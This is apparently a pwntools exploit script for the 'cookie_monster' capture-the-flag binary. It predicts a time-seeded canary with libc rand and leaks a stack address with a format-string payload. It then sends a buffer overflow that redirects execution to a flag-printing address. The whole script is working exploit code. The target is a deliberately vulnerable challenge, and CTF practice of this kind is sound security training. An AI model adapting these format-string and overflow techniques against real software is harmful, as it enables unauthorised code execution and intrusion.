from pwn import *
from ctypes import CDLL
from time import *
libc = CDLL('libc.so.6')
now = int(time())
libc.srand(now)
#p=remote('ctf.umbccd.io', 4200)
p=process("./cookie_monster")




def leak_stack(r):
	payload = ""
	payload += "|%17$p"
	r.sendlineafter('Oh hello there, what\'s your name?\n',payload)
	stack = r.recvline().split('|')[1]
	addr = int(stack,16)
	print "leaked addr: "+hex(addr)
	return addr

def exploit(r):
	cookie  = libc.rand()
	padd = "A" * 13
	falg_addr = leak_stack(r)
	flag_addr = falg_addr - 386
	print "flag addr: " + hex(flag_addr)
	payload = ""
	payload += padd
	payload += p32(cookie)
	payload += "AAAABBBB"
	payload += p64(flag_addr)

	r.sendlineafter('Would you like a cookie?\n',payload)
	r.interactive()


exploit(p)